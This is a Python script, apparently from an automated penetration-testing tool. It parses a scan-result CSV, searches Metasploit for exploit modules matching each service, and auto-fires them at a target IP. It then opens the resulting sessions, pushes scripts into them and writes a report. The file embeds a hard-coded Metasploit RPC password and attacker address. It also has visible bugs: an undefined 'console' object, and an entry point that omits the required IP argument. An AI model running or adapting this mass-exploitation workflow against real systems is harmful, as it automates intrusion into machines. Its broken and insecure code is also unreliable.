import argparse
import csv
from pymetasploit3.msfrpc import MsfRpcClient
from .exploit_functions import *
from colorama import Fore, init

init(autoreset=True)

service_exploits = {}  # Global dictionary to store searched exploits

def parse_csv(file_path):
    parsed_data = {}

    try:
        with open(file_path, 'r') as csvfile:
            reader = csv.reader(csvfile)
            for row in reader:
                if len(row) < 4:
                    print("Skipping row due to missing or incomplete data.")
                    continue
                ip_address = row[0]
                port = row[1]
                service = row[2]
                version_info = row[3]
                vulnerability_ids = row[4] if len(row) >= 5 else ''

                # Parse version information subfields
                version_subfields = {}
                if version_info:
                    parts = version_info.split()
                    current_key = None
                    for part in parts:
                        if ':' in part:
                            current_key, value = part.split(':', 1)
                            version_subfields[current_key.strip().lower()] = value.strip()
                        elif current_key:
                            version_subfields[current_key] += ' ' + part

                # Extract product name, version number, platform, protocol from version subfields
                product = version_subfields.get('product', '') or service
                version = version_subfields.get('version', '')
                platform = version_subfields.get('ostype', '')

                # Extract vulnerability IDs
                vulnerabilities = []
                if vulnerability_ids:
                    vulnerabilities = [v.strip() for v in vulnerability_ids.split(',')]

                # Construct parsed data dictionary
                if port:
                    parsed_data[port] = {
                        'IP Address': ip_address,
                        'Service': service,
                        'Product': product,
                        'Version': version,
                        'Platform': platform,
                        'Vulnerability IDs': vulnerabilities
                    }
                else:
                    print("Skipping row due to missing port information.")

    except FileNotFoundError:
        print(f"File '{file_path}' not found.")
    except Exception as e:
        print(f"An error occurred: {e}")

    return parsed_data


def search_exploits_by_product_and_version(client, product, version, platform=None, module_type='exploit'):
    """
    Search for exploits by product, version, and optionally platform.

    Args:
    - client: The Metasploit client object.
    - product (str): The name of the product.
    - version (str): The version of the product.
    - platform (str, optional): The platform of the product. Defaults to None.
    - module_type (str, optional): The type of module to search for. Defaults to 'exploit'.
    """
    global service_exploits

    try:
        # Build search arguments based on product and version
        search_arguments = f'name:{product} version:{version}'
        if platform:
            search_arguments += f' platform:{platform}'
        else:
            search_arguments += f' platform:linux'
        console.print(f'{search_arguments} type:{module_type}')
        search_result = client.modules.search(f'{search_arguments} type:{module_type}')
        
        # Extract module names from search result
        modules = [module['fullname'] for module in search_result]

        # Append searched modules to the global dictionary
        if product not in service_exploits:
            service_exploits[product] = []
        service_exploits[product].extend(modules)

    except Exception as e:
        console.print(f"[red]Error occurred while searching for exploits:[/red] {e}")



def search_exploits(client, service_name, platform, module_type='exploit'):
    """
    Search for exploits by service name and platform.

    Args:
    - client: The Metasploit client object.
    - service_name (str): The name of the service.
    - platform (str): The platform of the service.
    - module_type (str, optional): The type of module to search for. Defaults to 'exploit'.
    """
    global service_exploits

    try:
        # Search for modules based on service name and platform
        search_arguments = f'name:{service_name}'
        if platform:
            search_arguments += f' platform:{platform}'
        else:
            search_arguments += f' platform:linux'
        print(f'{search_arguments} type:{module_type}')
        search_result = client.modules.search(f'{search_arguments} type:{module_type}')
#        print(search_result)
        # Extract module names from search result
        modules = [module['fullname'] for module in search_result]

        # Append searched modules to the global dictionary
        if service_name not in service_exploits:
            service_exploits[service_name] = []
        service_exploits[service_name].extend(modules)

    except Exception as e:
        print(f"Error occurred while searching for exploits: {e}")


def exploit_main(ip_address, verbose=True):
    try:
        client = MsfRpcClient(username="msf", password="abc123", port=55552, ssl=True)
        if client.login("msf", "abc123"):
            print(Fore.GREEN + "Successfully connected to the Metasploit RPC server!")
            rhosts = ip_address  # Assuming rhosts is the ip_address passed to the function
            lhost = "10.0.2.15"
            lport = ""  # Enter attacker port
            csv_file = "Exploitable.csv"
            parsed_data = parse_csv(csv_file)
            for port, service_info in parsed_data.items():
                service_name = service_info['Service']
                platform = service_info['Platform'].lower().strip()
                print(Fore.CYAN + f"Processing service: {service_name} on platform: {platform}")
                if service_name in ['http', 'exec', 'httpd', '']:
                    print(Fore.RED + "This service cannot be exploited, we are improving :)")
                else:
                    search_exploits(client, service_name, platform)
            print(Fore.CYAN + "Service exploits collected:", service_exploits)
            print(Fore.BLUE + "Initiating exploitation attempts...")

            for service_name, selected_exploits in service_exploits.items():
                if not selected_exploits:
                    print(Fore.YELLOW + f"No exploit modules found for service '{service_name}'. Skipping...")
                    continue
                try:
                    print(Fore.MAGENTA + f"Currently exploiting service: {service_name}")
                    if verbose:
                        exploit_results = choose_exploit_auto_run_verbose(client, selected_exploits, rhosts, lhost, lport)
                    else:
                        exploit_results = choose_exploit_auto_run_non_verbose(client, selected_exploits, rhosts, lhost, lport)
                except Exception as e:
                    print(Fore.RED + f"Error occurred while running exploits for service '{service_name}': {e}")

            open_session(client)
            generate_report_en(client, service_exploits)
            send_scripts(client)
            close_all_sessions(client)
        else:
            print(Fore.RED + "Failed to authenticate with the Metasploit RPC server.")
    except Exception as e:
        print(Fore.RED + f"An error occurred: {e}")


if __name__ == "__main__":
    exploit_main()
